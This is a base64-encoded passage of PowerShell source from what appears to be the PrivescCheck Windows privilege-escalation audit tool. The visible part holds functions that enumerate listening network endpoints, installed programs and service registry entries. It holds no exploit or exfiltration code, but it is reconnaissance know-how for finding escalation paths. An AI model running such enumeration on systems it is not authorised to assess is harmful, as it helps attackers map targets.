2NjcgMC4wLjAuMDo0OTY2NyAgICBMSVNURU5JTkcgIDE4NjAgc3ZjaG9zdAogICAgSVB2NCBUQ1AgICAwLjAuMC4wICAgICAgICAgIDQ5NjY4IDAuMC4wLjA6NDk2NjggICAgTElTVEVOSU5HICAyOTcyIHN2Y2hvc3QKICAgIElQdjQgVENQICAgMC4wLjAuMCAgICAgICAgICA0OTY2OSAwLjAuMC4wOjQ5NjY5ICAgIExJU1RFTklORyAgNDQ4MCBzcG9vbHN2CiAgICBJUHY0IFRDUCAgIDAuMC4wLjAgICAgICAgICAgNDk2NzAgMC4wLjAuMDo0OTY3MCAgICBMSVNURU5JTkcgICA5NjQgc2VydmljZXMKICAgIAogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+IEdldC1OZXR3b3JrRW5kcG9pbnRzIC1VRFAgLUlQdjYgfCBmdAoKICAgIElQICAgUHJvdG8gTG9jYWxBZGRyZXNzIExvY2FsUG9ydCBFbmRwb2ludCAgICBTdGF0ZSAgUElEIE5hbWUgICAgICAgCiAgICAtLSAgIC0tLS0tIC0tLS0tLS0tLS0tLSAtLS0tLS0tLS0gLS0tLS0tLS0gICAgLS0tLS0gIC0tLSAtLS0tCiAgICBJUHY2IFVEUCAgIDo6ICAgICAgICAgICAgICAgICA1MDAgWzo6XTo1MDAgICAgTi9BICAgNTAwMCBzdmNob3N0CiAgICBJUHY2IFVEUCAgIDo6ICAgICAgICAgICAgICAgIDM3MDIgWzo6XTozNzAyICAgTi9BICAgNDEyOCBkYXNIb3N0CiAgICBJUHY2IFVEUCAgIDo6ICAgICAgICAgICAgICAgIDM3MDIgWzo6XTozNzAyICAgTi9BICAgNDEyOCBkYXNIb3N0CiAgICBJUHY2IFVEUCAgIDo6ICAgICAgICAgICAgICAgIDQ1MDAgWzo6XTo0NTAwICAgTi9BICAgNTAwMCBzdmNob3N0CiAgICBJUHY2IFVEUCAgIDo6ICAgICAgICAgICAgICAgNjIyMTIgWzo6XTo2MjIxMiAgTi9BICAgNDEyOCBkYXNIb3N0CiAgICBJUHY2IFVEUCAgIDo6MSAgICAgICAgICAgICAgIDE5MDAgWzo6MV06MTkwMCAgTi9BICAgNTg2MCBzdmNob3N0CiAgICBJUHY2IFVEUCAgIDo6MSAgICAgICAgICAgICAgNjMxNjggWzo6MV06NjMxNjggTi9BICAgNTg2MCBzdmNob3N0IAogICAgIz4KCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgKICAgICAgICBbc3dpdGNoXQogICAgICAgICRJUHY2ID0gJEZhbHNlLCAjIElQdjQgYnkgZGVmYXVsdCAKICAgICAgICBbc3dpdGNoXQogICAgICAgICRVRFAgPSAkRmFsc2UgIyBUQ1AgYnkgZGVmYXVsdCAKICAgICkKCiAgICAkQUZfSU5FVDYgPSAyMwogICAgJEFGX0lORVQgPSAyCiAgICAKICAgIGlmICgkSVB2NikgeyAKICAgICAgICAkSXBWZXJzaW9uID0gJEFGX0lORVQ2CiAgICB9IGVsc2UgewogICAgICAgICRJcFZlcnNpb24gPSAkQUZfSU5FVAogICAgfQoKICAgIGlmICgkVURQKSB7CiAgICAgICAgJFVEUF9UQUJMRV9PV05FUl9QSUQgPSAxCiAgICAgICAgW2ludF0kQnVmU2l6ZSA9IDAKICAgICAgICAkUmVzdWx0ID0gW1ByaXZlc2NDaGVjay5XaW4zMl06OkdldEV4dGVuZGVkVWRwVGFibGUoW0ludFB0cl06Olplcm8sIFtyZWZdJEJ1ZlNpemUsICRUcnVlLCAkSXBWZXJzaW9uLCAkVURQX1RBQkxFX09XTkVSX1BJRCwgMCkKICAgICAgICAkTGFzdEVycm9yID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCiAgICB9IGVsc2UgewogICAgICAgICRUQ1BfVEFCTEVfT1dORVJfUElEX0xJU1RFTkVSID0gMwogICAgICAgIFtpbnRdJEJ1ZlNpemUgPSAwCiAgICAgICAgJFJlc3VsdCA9IFtQcml2ZXNjQ2hlY2suV2luMzJdOjpHZXRFeHRlbmRlZFRjcFRhYmxlKFtJbnRQdHJdOjpaZXJvLCBbcmVmXSRCdWZTaXplLCAkVHJ1ZSwgJElwVmVyc2lvbiwgJFRDUF9UQUJMRV9PV05FUl9QSURfTElTVEVORVIsIDApCiAgICAgICAgJExhc3RFcnJvciA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQogICAgfQoKICAgIGlmICgkUmVzdWx0IC1lcSAxMjIpIHsKCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiR2V0RXh0ZW5kZWRQcm90b1RhYmxlKCkgT0sgLSBTaXplOiAkQnVmU2l6ZSIKCiAgICAgICAgW0ludFB0cl0kVGFibGVQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJEJ1ZlNpemUpCgogICAgICAgIGlmICgkVURQKSB7CiAgICAgICAgICAgICRSZXN1bHQgPSBbUHJpdmVzY0NoZWNrLldpbjMyXTo6R2V0RXh0ZW5kZWRVZHBUYWJsZSgkVGFibGVQdHIsIFtyZWZdJEJ1ZlNpemUsICRUcnVlLCAkSXBWZXJzaW9uLCAkVURQX1RBQkxFX09XTkVSX1BJRCwgMCkKICAgICAgICAgICAgJExhc3RFcnJvciA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRSZXN1bHQgPSBbUHJpdmVzY0NoZWNrLldpbjMyXTo6R2V0RXh0ZW5kZWRUY3BUYWJsZSgkVGFibGVQdHIsIFtyZWZdJEJ1ZlNpemUsICRUcnVlLCAkSXBWZXJzaW9uLCAkVENQX1RBQkxFX09XTkVSX1BJRF9MSVNURU5FUiwgMCkKICAgICAgICAgICAgJExhc3RFcnJvciA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQogICAgICAgIH0KCiAgICAgICAgaWYgKCRSZXN1bHQgLWVxIDApIHsKCiAgICAgICAgICAgIGlmICgkVURQKSB7CiAgICAgICAgICAgICAgICBpZiAoJElwVmVyc2lvbiAtZXEgJEFGX0lORVQpIHsgCiAgICAgICAgICAgICAgICAgICAgJFRhYmxlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFRhYmxlUHRyLCBbdHlwZV0gW1ByaXZlc2NDaGVjay5XaW4zMitNSUJfVURQVEFCTEVfT1dORVJfUElEXSkKICAgICAgICAgICAgICAgIH0gZWxzZWlmICgkSXBWZXJzaW9uIC1lcSAkQUZfSU5FVDYpIHsgCiAgICAgICAgICAgICAgICAgICAgJFRhYmxlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFRhYmxlUHRyLCBbdHlwZV0gW1ByaXZlc2NDaGVjay5XaW4zMitNSUJfVURQNlRBQkxFX09XTkVSX1BJRF0pCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBpZiAoJElwVmVyc2lvbiAtZXEgJEFGX0lORVQpIHsgCiAgICAgICAgICAgICAgICAgICAgJFRhYmxlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFRhYmxlUHRyLCBbdHlwZV0gW1ByaXZlc2NDaGVjay5XaW4zMitNSUJfVENQVEFCTEVfT1dORVJfUElEXSkKICAgICAgICAgICAgICAgIH0gZWxzZWlmICgkSXBWZXJzaW9uIC1lcSAkQUZfSU5FVDYpIHsgCiAgICAgICAgICAgICAgICAgICAgJFRhYmxlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFRhYmxlUHRyLCBbdHlwZV0gW1ByaXZlc2NDaGVjay5XaW4zMitNSUJfVENQNlRBQkxFX09XTkVSX1BJRF0pCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICROdW1FbnRyaWVzID0gJFRhYmxlLmR3TnVtRW50cmllcwoKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiR2V0RXh0ZW5kZWRQcm90b1RhYmxlKCkgT0sgLSBOdW1FbnRyaWVzOiAkTnVtRW50cmllcyIKCiAgICAgICAgICAgICRPZmZzZXQgPSBbSW50UHRyXSAoJFRhYmxlUHRyLlRvSW50NjQoKSArIDQpCgogICAgICAgICAgICBGb3IgKCRpID0gMDsgJGkgLWx0ICROdW1FbnRyaWVzOyAkaSsrKSB7CgogICAgICAgICAgICAgICAgaWYgKCRVRFApIHsKICAgICAgICAgICAgICAgICAgICBpZiAoJElwVmVyc2lvbiAtZXEgJEFGX0lORVQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFRhYmxlRW50cnkgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkT2Zmc2V0LCBbdHlwZV0gW1ByaXZlc2NDaGVjay5XaW4zMitNSUJfVURQUk9XX09XTkVSX1BJRF0pCiAgICAgICAgICAgICAgICAgICAgICAgICRMb2NhbEFkZHIgPSAoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLk5ldC5JUEFkZHJlc3MoJFRhYmxlRW50cnkubG9jYWxBZGRyKSkuSVBBZGRyZXNzVG9TdHJpbmcKICAgICAgICAgICAgICAgICAgICB9IGVsc2VpZiAoJElwVmVyc2lvbiAtZXEgJEFGX0lORVQ2KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRUYWJsZUVudHJ5ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJE9mZnNldCwgW3R5cGVdIFtQcml2ZXNjQ2hlY2suV2luMzIrTUlCX1VEUDZST1dfT1dORVJfUElEXSkKICAgICAgICAgICAgICAgICAgICAgICAgJExvY2FsQWRkciA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5OZXQuSVBBZGRyZXNzKCRUYWJsZUVudHJ5LmxvY2FsQWRkciwgJFRhYmxlRW50cnkubG9jYWxTY29wZUlkKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRJcFZlcnNpb24gLWVxICRBRl9JTkVUKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRUYWJsZUVudHJ5ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJE9mZnNldCwgW3R5cGVdIFtQcml2ZXNjQ2hlY2suV2luMzIrTUlCX1RDUFJPV19PV05FUl9QSURdKQogICAgICAgICAgICAgICAgICAgICAgICAkTG9jYWxBZGRyID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5OZXQuSVBBZGRyZXNzKCRUYWJsZUVudHJ5LmxvY2FsQWRkcikpLklQQWRkcmVzc1RvU3RyaW5nCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlaWYgKCRJcFZlcnNpb24gLWVxICRBRl9JTkVUNikgewogICAgICAgICAgICAgICAgICAgICAgICAkVGFibGVFbnRyeSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRPZmZzZXQsIFt0eXBlXSBbUHJpdmVzY0NoZWNrLldpbjMyK01JQl9UQ1A2Uk9XX09XTkVSX1BJRF0pCiAgICAgICAgICAgICAgICAgICAgICAgICRMb2NhbEFkZHIgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uTmV0LklQQWRkcmVzcygkVGFibGVFbnRyeS5sb2NhbEFkZHIsICRUYWJsZUVudHJ5LmxvY2FsU2NvcGVJZCkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJExvY2FsUG9ydCA9ICRUYWJsZUVudHJ5LmxvY2FsUG9ydFswXSAqIDB4MTAwICsgJFRhYmxlRW50cnkubG9jYWxQb3J0WzFdCiAgICAgICAgICAgICAgICAkUHJvY2Vzc0lkID0gJFRhYmxlRW50cnkub3duaW5nUGlkCgogICAgICAgICAgICAgICAgaWYgKCRJcFZlcnNpb24gLWVxICRBRl9JTkVUKSB7CiAgICAgICAgICAgICAgICAgICAgJExvY2FsQWRkcmVzcyA9ICIkKCRMb2NhbEFkZHIpOiQoJExvY2FsUG9ydCkiCiAgICAgICAgICAgICAgICB9IGVsc2VpZiAoJElwVmVyc2lvbiAtZXEgJEFGX0lORVQ2KSB7CiAgICAgICAgICAgICAgICAgICAgJExvY2FsQWRkcmVzcyA9ICJbJCgkTG9jYWxBZGRyKV06JCgkTG9jYWxQb3J0KSIKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAkTGlzdGVuZXJPYmplY3QgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAKICAgICAgICAgICAgICAgICRMaXN0ZW5lck9iamVjdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIklQIiAtVmFsdWUgJChpZiAoJElwVmVyc2lvbiAtZXEgJEFGX0lORVQpIHsgIklQdjQiIH0gZWxzZSB7ICJJUHY2IiB9ICkKICAgICAgICAgICAgICAgICRMaXN0ZW5lck9iamVjdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlByb3RvIiAtVmFsdWUgJChpZiAoJFVEUCkgeyAiVURQIiB9IGVsc2UgeyAiVENQIiB9ICkKICAgICAgICAgICAgICAgICRMaXN0ZW5lck9iamVjdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkxvY2FsQWRkcmVzcyIgLVZhbHVlICRMb2NhbEFkZHIKICAgICAgICAgICAgICAgICRMaXN0ZW5lck9iamVjdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkxvY2FsUG9ydCIgLVZhbHVlICRMb2NhbFBvcnQKICAgICAgICAgICAgICAgICRMaXN0ZW5lck9iamVjdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkVuZHBvaW50IiAtVmFsdWUgJExvY2FsQWRkcmVzcwogICAgICAgICAgICAgICAgJExpc3RlbmVyT2JqZWN0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiU3RhdGUiIC1WYWx1ZSAkKGlmICgkVURQKSB7ICJOL0EiIH0gZWxzZSB7ICJMSVNURU5JTkciIH0gKQogICAgICAgICAgICAgICAgJExpc3RlbmVyT2JqZWN0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiUElEIiAtVmFsdWUgJFByb2Nlc3NJZAogICAgICAgICAgICAgICAgJExpc3RlbmVyT2JqZWN0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiTmFtZSIgLVZhbHVlIChHZXQtUHJvY2VzcyAtUElEICRQcm9jZXNzSWQpLlByb2Nlc3NOYW1lCiAgICAgICAgICAgICAgICAkTGlzdGVuZXJPYmplY3QKCiAgICAgICAgICAgICAgICAkT2Zmc2V0ID0gW0ludFB0cl0gKCRPZmZzZXQuVG9JbnQ2NCgpICsgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKCRUYWJsZUVudHJ5KSkKICAgICAgICAgICAgfQoKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlIChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpCiAgICAgICAgfQoKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpGcmVlSEdsb2JhbCgkVGFibGVQdHIpCgogICAgfSBlbHNlIHsKICAgICAgICBXcml0ZS1WZXJib3NlIChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpCiAgICB9Cn0KCmZ1bmN0aW9uIEdldC1JbnN0YWxsZWRQcm9ncmFtcyB7CiAgICA8IwogICAgLlNZTk9QU0lTCgogICAgSGVscGVyIC0gRW51bWVyYXRlcyB0aGUgaW5zdGFsbGVkIGFwcGxpY2F0aW9ucyAKCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIFRoaXMgbG9va3MgZm9yIGFwcGxpY2F0aW9ucyBpbnN0YWxsZWQgaW4gdGhlIGNvbW1vbiAiUHJvZ3JhbSBGaWxlcyIgYW5kICJQcm9ncmFtIEZpbGVzICh4ODYpIiAKICAgIGZvbGRlcnMuIEl0IGFsc28gZW51bWVyYXRlcyBpbnN0YWxsZWQgYXBwbGljYXRpb25zIHRoYW5rcyB0byB0aGUgcmVnaXN0cnkgYnkgbG9va2luZyBmb3IgYWxsCiAgICB0aGUgc3Via2V5cyBpbiAiSEtFWV9MT0NBTF9NQUNISU5FXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCIuCgogICAgLlBBUkFNRVRFUiBGaWx0ZXJlZAoKICAgIElmIFRydWUsIG9ubHkgbm9uLWRlZmF1bHQgYXBwbGljYXRpb25zIGFyZSByZXR1cm5lZC4gT3RoZXJ3aXNlLCBhbGwgdGhlIGFwcGxpY2F0aW9ucyBhcmUgCiAgICByZXR1cm5lZC4gVGhlIGZpbHRlciBpcyBiYXNlIG9uIGEgbGlzdCBvZiBrbm93biBhcHBsaWNhdGlvbnMgd2hpY2ggYXJlIGtub3duIHRvIGJlIGluc3RhbGxlZAogICAgYnkgZGVmYXVsdCAoZS5nLjogIldpbmRvd3MgRGVmZW5kZXIiKS4KICAgIAogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+IEdldC1JbnN0YWxsZWRQcm9ncmFtcyAtRmlsdGVyZWQKCiAgICBNb2RlICAgICAgICAgICAgICAgIExhc3RXcml0ZVRpbWUgICAgIExlbmd0aCBOYW1lCiAgICAtLS0tICAgICAgICAgICAgICAgIC0tLS0tLS0tLS0tLS0gICAgIC0tLS0tLSAtLS0tCiAgICBkLS0tLSAgICAgICAgMjkvMTEvMjAxOSAgICAgMTA6NTEgICAgICAgICAgICBOcGNhcAogICAgZC0tLS0gICAgICAgIDI5LzExLzIwMTkgICAgIDEwOjUxICAgICAgICAgICAgV2lyZXNoYXJrCiAgICAKICAgICM+CiAgICAKICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtKAogICAgICAgIFtzd2l0Y2hdCiAgICAgICAgJEZpbHRlcmVkID0gJEZhbHNlCiAgICApCgogICAgJElnbm9yZWRQcm9ncmFtcyA9IEAoIkNvbW1vbiBGaWxlcyIsICJJbnRlcm5ldCBFeHBsb3JlciIsICJNb2RpZmlhYmxlV2luZG93c0FwcHMiLCAiUGFja2FnZU1hbmFnZW1lbnQiLCAiV2luZG93cyBEZWZlbmRlciIsICJXaW5kb3dzIERlZmVuZGVyIEFkdmFuY2VkIFRocmVhdCBQcm90ZWN0aW9uIiwgIldpbmRvd3MgTWFpbCIsICJXaW5kb3dzIE1lZGlhIFBsYXllciIsICJXaW5kb3dzIE11bHRpbWVkaWEgUGxhdGZvcm0iLCAiV2luZG93cyBOVCIsICJXaW5kb3dzIFBob3RvIFZpZXdlciIsICJXaW5kb3dzIFBvcnRhYmxlIERldmljZXMiLCAiV2luZG93cyBTZWN1cml0eSIsICJXaW5kb3dzUG93ZXJTaGVsbCIsICJNaWNyb3NvZnQuTkVUIiwgIldpbmRvd3MgUG9ydGFibGUgRGV2aWNlcyIsICJkb3RuZXQiLCAiTVNCdWlsZCIsICJJbnRlbCIsICJSZWZlcmVuY2UgQXNzZW1ibGllcyIpCgogICAgJEluc3RhbGxlZFByb2dyYW1zUmVzdWx0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CgogICAgJEluc3RhbGxlZFByb2dyYW1zID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CgogICAgJFBhdGhQcm9ncmFtMzIgPSBKb2luLVBhdGggLVBhdGggJGVudjpTeXN0ZW1Ecml2ZSAtQ2hpbGRQYXRoICJQcm9ncmFtIEZpbGVzICh4ODYpIgogICAgJFBhdGhQcm9ncmFtNjQgPSBKb2luLVBhdGggLVBhdGggJGVudjpTeXN0ZW1Ecml2ZSAtQ2hpbGRQYXRoICJQcm9ncmFtIEZpbGVzIiAKCiAgICAkSXRlbXMgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRQYXRoUHJvZ3JhbTMyLCRQYXRoUHJvZ3JhbTY0IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoJEl0ZW1zKSB7CiAgICAgICAgW3ZvaWRdJEluc3RhbGxlZFByb2dyYW1zLkFkZFJhbmdlKCRJdGVtcykKICAgIH0KICAgIAogICAgJFJlZ0luc3RhbGxlZFByb2dyYW1zID0gR2V0LUNoaWxkSXRlbSAtUGF0aCAiUmVnaXN0cnk6OkhLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGwiIAogICAgJFJlZ0luc3RhbGxlZFByb2dyYW1zNjQzMiA9IEdldC1DaGlsZEl0ZW0gLVBhdGggIlJlZ2lzdHJ5OjpIS0VZX0xPQ0FMX01BQ0hJTkVcU09GVFdBUkVcV09XNjQzMk5vZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgaWYgKCRSZWdJbnN0YWxsZWRQcm9ncmFtczY0MzIpIHsgJFJlZ0luc3RhbGxlZFByb2dyYW1zICs9ICRSZWdJbnN0YWxsZWRQcm9ncmFtczY0MzIgfQogICAgRm9yRWFjaCAoJEluc3RhbGxlZFByb2dyYW0gaW4gJFJlZ0luc3RhbGxlZFByb2dyYW1zKSB7CiAgICAgICAgJEluc3RhbGxMb2NhdGlvbiA9IFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpFeHBhbmRFbnZpcm9ubWVudFZhcmlhYmxlcygkSW5zdGFsbGVkUHJvZ3JhbS5HZXRWYWx1ZSgiSW5zdGFsbExvY2F0aW9uIikpCiAgICAgICAgaWYgKCRJbnN0YWxsTG9jYXRpb24pIHsKICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkSW5zdGFsbExvY2F0aW9uIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSB7CiAgICAgICAgICAgICAgICBpZiAoJEluc3RhbGxMb2NhdGlvblskSW5zdGFsbExvY2F0aW9uLkxlbmd0aCAtIDFdIC1lcSAiXCIpIHsKICAgICAgICAgICAgICAgICAgICAkSW5zdGFsbExvY2F0aW9uID0gJEluc3RhbGxMb2NhdGlvbi5TdWJTdHJpbmcoMCwgJEluc3RhbGxMb2NhdGlvbi5MZW5ndGggLSAxKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJEZpbGVPYmplY3QgPSBHZXQtSXRlbSAtUGF0aCAkSW5zdGFsbExvY2F0aW9uIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIC1FcnJvclZhcmlhYmxlIEdldEl0ZW1FcnJvciAKICAgICAgICAgICAgICAgIGlmICgkR2V0SXRlbUVycm9yKSB7CiAgICAgICAgICAgICAgICAgICAgY29udGludWUgCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJEZpbGVPYmplY3QgLWlzIFtTeXN0ZW0uSU8uRGlyZWN0b3J5SW5mb10pIHsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgW3ZvaWRdJEluc3RhbGxlZFByb2dyYW1zLkFkZChbb2JqZWN0XSRGaWxlT2JqZWN0KQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgICRQYXRoTGlzdFJlc3VsdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgRm9yRWFjaCAoJEluc3RhbGxlZFByb2dyYW0gaW4gJEluc3RhbGxlZFByb2dyYW1zKSB7CiAgICAgICAgaWYgKC1ub3QgKCRQYXRoTGlzdFJlc3VsdCAtY29udGFpbnMgJEluc3RhbGxlZFByb2dyYW0uRnVsbE5hbWUpKSB7CiAgICAgICAgICAgIFt2b2lkXSRJbnN0YWxsZWRQcm9ncmFtc1Jlc3VsdC5BZGQoJEluc3RhbGxlZFByb2dyYW0pCiAgICAgICAgICAgIFt2b2lkXSRQYXRoTGlzdFJlc3VsdC5BZGQoJEluc3RhbGxlZFByb2dyYW0uRnVsbE5hbWUpCiAgICAgICAgfQogICAgfQoKICAgIGlmICgkRmlsdGVyZWQpIHsKICAgICAgICAkSW5zdGFsbGVkUHJvZ3JhbXNSZXN1bHRGaWx0ZXJlZCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICAgICBGb3JFYWNoICgkSW5zdGFsbGVkUHJvZ3JhbSBpbiAkSW5zdGFsbGVkUHJvZ3JhbXNSZXN1bHQpIHsKICAgICAgICAgICAgaWYgKC1Ob3QgKCRJZ25vcmVkUHJvZ3JhbXMgLWNvbnRhaW5zICRJbnN0YWxsZWRQcm9ncmFtLk5hbWUpKSB7CiAgICAgICAgICAgICAgICBbdm9pZF0kSW5zdGFsbGVkUHJvZ3JhbXNSZXN1bHRGaWx0ZXJlZC5BZGQoJEluc3RhbGxlZFByb2dyYW0pCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJEluc3RhbGxlZFByb2dyYW1zUmVzdWx0RmlsdGVyZWQKICAgIH0gZWxzZSB7CiAgICAgICAgJEluc3RhbGxlZFByb2dyYW1zUmVzdWx0CiAgICB9Cn0KCmZ1bmN0aW9uIEdldC1TZXJ2aWNlRnJvbVJlZ2lzdHJ5IHsKCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgKICAgICAgICBbc3RyaW5nXSROYW1lCiAgICApCgogICAgJFNlcnZpY2VzUmVnUGF0aCA9ICJIS0xNXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlcyIgCiAgICAkU2VydmljZVJlZ1BhdGggPSBKb2luLVBhdGggLVBhdGggJFNlcnZpY2VzUmVnUGF0aCAtQ2hpbGRQYXRoICROYW1lCgogICAgJFNlcnZpY2VQcm9wZXJ0aWVzID0gR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiUmVnaXN0cnk6OiRTZXJ2aWNlUmVnUGF0aCIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgLUVycm9yVmFyaWFibGUgR2V0SXRlbVByb3BlcnR5RXJyb3IKICAgIGlmICgtbm90ICRHZXRJdGVtUHJvcGVydHlFcnJvcikgewoKICAgICAgICAkRGlzcGxheU5hbWUgPSBbU3lzdGVtLkVudmlyb25tZW50XTo6RXhwYW5kRW52aXJvbm1lbnRWYXJpYWJsZXMoJFNlcnZpY2VQcm9wZXJ0aWVzLkRpc3BsYXlOYW1lKQoKICAgICAgICAkU2VydmljZUl0ZW0gPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAKICAgICAgICAkU2VydmljZUl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJOYW1lIiAtVmFsdWUgJFNlcnZpY2VQcm9wZXJ0aWVzLlBTQ2hpbGROYW1lCiAgICAgICAgJFNlcnZpY2VJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiRGlzcGxheU5hbWUiIC1WYWx1ZSAkRGlzcGxheU5hbWUKICAgICAgICAkU2VydmljZUl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJVc2VyIiAtVmFsdWUgJFNlcnZpY2VQcm9wZXJ0aWVzLk9iamVjdE5hbWUgCiAgICAgICAgJFNlcnZpY2VJdGVtIHwgQWRkLU1lbW